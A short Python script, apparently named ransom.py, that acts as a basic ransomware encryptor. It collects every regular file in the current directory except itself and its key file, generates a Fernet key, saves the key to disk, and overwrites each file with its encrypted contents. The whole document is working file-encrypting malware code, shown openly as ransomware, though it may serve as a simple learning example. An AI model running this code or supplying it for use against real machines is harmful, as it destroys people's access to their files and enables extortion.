import os   
from cryptography.fernet import Fernet

fileList = []

for file in os.listdir():
    if file == "ransom.py" or file == "generatedkey.key":
        continue
    if os.path.isfile(file):
        fileList.append(file)

print(fileList)

key = Fernet.generate_key()

print(key)

with open("generatedkey.key", "wb") as generatedkey:
    generatedkey.write(key)

for file in fileList:
    with open(file, "rb") as theFile:
        contents = theFile.read()
    contentsEncrypted = Fernet(key).encrypt(contents)
    with open (file, "wb") as theFile:
        theFile.write(contentsEncrypted)
